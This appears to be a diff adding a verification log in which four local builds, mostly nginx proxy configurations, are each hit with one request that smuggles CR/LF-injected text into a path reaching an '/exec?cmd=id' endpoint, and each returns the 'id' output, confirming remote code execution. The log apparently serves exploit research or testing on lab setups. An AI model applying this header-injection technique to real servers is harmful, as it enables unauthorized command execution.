@@ -1,0 +1,40 @@
+Fresh-build re-verification of all four RCE builds.
+Each section: preflight gate, brand-new upstream, brand-new server, exactly one request.
+Re-run 2026-11-16 after the probes were vendored and preflighted.
+
+--- stage-05 ae021893  (s05-run4, ./cfg_up, port 18841, upstream 19894)
+preflight: port 18841 free
+HTTP/1.1 200 OK
+x-saw: GET //exec?cmd=id<CR><LF>Host: b
+Content-Length: 138
+Connection: keep-alive
+
+EXEC[id]=uid=1000(mouse9911) gid=1000(mouse9911) groups=1000(mouse9911),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),101(lxd)
+
+--- stage-10 61cc738c  (s10-run1, ./nginx_proxy.conf, port 19001, upstream 19501)
+preflight: port 19001 free
+HTTP/1.1 200 OK
+x-saw: GET /exec?cmd=id<CR><LF>Host: b
+Content-Length: 138
+Connection: close
+
+EXEC[id]=uid=1000(mouse9911) gid=1000(mouse9911) groups=1000(mouse9911),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),101(lxd)
+
+--- stage-10 8d5ff1f2  (s10-run4, ./nginx_proxy.conf, port 19031, upstream 19504)
+preflight: port 19031 free
+HTTP/1.1 200 OK
+x-saw: GET /exec?cmd=id<CR><LF>Host: b
+Content-Length: 138
+Connection: keep-alive
+
+EXEC[id]=uid=1000(mouse9911) gid=1000(mouse9911) groups=1000(mouse9911),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),101(lxd)
+
+--- stage-10 6fb186ed  (s10-run6, ./nginx_proxy.conf, port 19051, upstream 19505)
+preflight: port 19051 free
+HTTP/1.1 200 OK
+X-Saw: GET /exec?cmd=id<CR><LF>Host: b
+Content-Length: 138
+Connection: keep-alive
+
+EXEC[id]=uid=1000(mouse9911) gid=1000(mouse9911) groups=1000(mouse9911),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),101(lxd)
+
